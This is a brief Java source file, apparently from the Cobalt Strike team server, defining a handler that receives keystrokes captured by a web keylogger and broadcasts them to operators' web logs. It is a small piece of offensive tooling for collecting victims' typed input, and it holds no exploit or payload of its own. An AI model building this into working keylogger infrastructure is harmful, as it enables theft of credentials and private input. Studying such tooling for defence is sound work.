package server;

import cloudstrike.Keylogger;
import common.WebKeyloggerEvent;

import java.util.Map;

public class KeyloggerHandler implements Keylogger.KeyloggerListener {
    protected Resources resources;

    protected String curl;

    public KeyloggerHandler(Resources resources, String string) {
        this.resources = resources;
        this.curl = string;
    }

    public void slowlyStrokeMe(String string1, String string2, Map map, String string3) {
        this.resources.broadcast("weblog", new WebKeyloggerEvent(this.curl, string2, map, string3));
    }
}
